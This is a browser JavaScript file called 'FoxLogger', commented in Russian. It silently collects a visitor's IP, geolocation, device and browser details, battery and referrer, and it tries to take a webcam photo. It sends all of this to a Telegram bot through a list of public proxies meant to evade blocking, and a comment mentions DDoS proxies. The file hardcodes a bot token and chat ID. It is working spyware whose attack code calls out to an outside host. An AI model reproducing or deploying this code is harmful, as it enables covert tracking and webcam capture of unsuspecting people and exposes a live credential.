// logger_proxy.js — отправка через публичные прокси
(async function() {
    "use strict";

    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
    const TELEGRAM_CHAT_ID = "8995427762";

    // СПИСОК ПРОКСИ ДЛЯ ОБХОДА БЛОКИРОВКИ
    const PROXIES = [
        "https://tg.api.webrav.ru/bot",      // Специальный прокси для Telegram
        "https://tgbots.xyz/bot",            // Еще один
        "https://telegram.systems/bot",      // И еще
        "https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot",  // CORS прокси
        "https://api.allorigins.win/raw?url=https://api.telegram.org/bot"     // Альтернативный
    ];

    // DDoS прокси (если нужны)
    const DDOS_PROXIES = [
        "https://proxy6.net/api/",           // Платные прокси
        "https://hidemy.name/ru/proxy-list/" // Списки прокси
    ];

    // ========== Сбор данных ==========
    let ipAddress = "0.0.0.0";
    let geo = "не определена";
    let city = "", country = "", lat = "", lon = "";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        city = geoData.city || "неизвестно";
        country = geoData.country_name || "неизвестно";
        lat = geoData.latitude || "?";
        lon = geoData.longitude || "?";
        geo = `${city}, ${country} (${lat}, ${lon})`;
    } catch(e) {
        console.warn("Geo error:", e);
    }

    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });

    const userAgent = navigator.userAgent;
    let deviceType = "не определено";
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "📱 Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = "💻 Компьютер";
    }
    
    let browser = "неизвестно";
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    
    let os = "неизвестно";
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS")) os = "iOS";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";

    let battery = "не доступно";
    if (navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            battery = `${Math.round(b.level * 100)}% (${b.charging ? "🔋 заряжается" : "🪫 не заряжается"})`;
        } catch(e) {}
    }

    const screen = `${screen.width}x${screen.height}`;
    const language = navigator.language || "ru";

    // Фото
    let photoBlob = null;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 500));
        
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
        
        photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
        stream.getTracks().forEach(track => track.stop());
    } catch(e) {}

    // Формируем сообщение
    const message = `🦊 НОВЫЙ ПЕРЕХОД FOXLOGGER

🌐 IP: ${ipAddress}
📍 Гео: ${geo}
🕐 Время: ${timeStr}
📱 Устройство: ${deviceType}
🌍 Браузер: ${browser}
💿 ОС: ${os}
🔋 Батарея: ${battery}
📺 Экран: ${screen}
🌐 Язык: ${language}
📎 Ссылка: ${window.location.href}
🔗 Реферер: ${document.referrer || "прямой переход"}

🦊 FoxLogger | @kuragalakrica`;

    // ========== Отправка через прокси (по очереди) ==========
    async function sendViaProxy(proxy, text, blob = null) {
        try {
            let url, options;
            
            if (blob) {
                // Отправка фото
                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "snapshot.jpg");
                formData.append("caption", text);
                options = { method: "POST", body: formData };
            } else {
                // Отправка текста
                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendMessage`;
                options = {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: text,
                        disable_web_page_preview: true
                    })
                };
            }
            
            const response = await fetch(url, options);
            const result = await response.json();
            
            if (result.ok) {
                return { success: true, proxy };
            } else {
                return { success: false, error: result.description };
            }
        } catch(e) {
            return { success: false, error: e.message };
        }
    }

    // Пробуем отправить через все прокси
    async function sendWithFallback(text, blob = null) {
        for (const proxy of PROXIES) {
            console.log(`Пробуем прокси: ${proxy}`);
            const result = await sendViaProxy(proxy, text, blob);
            if (result.success) {
                console.log(`✅ Успешно через: ${proxy}`);
                return true;
            } else {
                console.log(`❌ Не работает: ${proxy} - ${result.error}`);
            }
            await new Promise(r => setTimeout(r, 500));
        }
        return false;
    }

    // Запуск отправки
    let sent = false;
    
    if (photoBlob) {
        sent = await sendWithFallback(message, photoBlob);
        if (!sent) {
            // Если фото не ушло, пробуем только текст
            sent = await sendWithFallback(message);
        }
    } else {
        sent = await sendWithFallback(message);
    }
    
    if (sent) {
        console.log("✅ Данные успешно отправлены!");
    } else {
        console.log("❌ Не удалось отправить данные через все прокси");
        // Сохраняем локально
        try {
            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
            failed.push({ data: message, time: new Date().toISOString() });
            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
        } catch(e) {}
    }
})();
